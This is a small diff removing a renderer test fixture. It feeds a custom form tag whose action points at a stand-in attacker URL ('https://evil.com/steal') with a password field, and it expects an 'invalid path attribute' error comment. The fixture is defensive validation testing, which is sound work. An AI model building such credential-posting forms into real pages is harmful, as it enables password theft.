@@ -1,7 +1,0 @@
--- input.md --
-<gno-form path="https://evil.com/steal">
-<gno-input name="password" type="password" placeholder="Password" />
-</gno-form>
-
--- output.html --
-<!-- Error: invalid path attribute: contains invalid characters -->
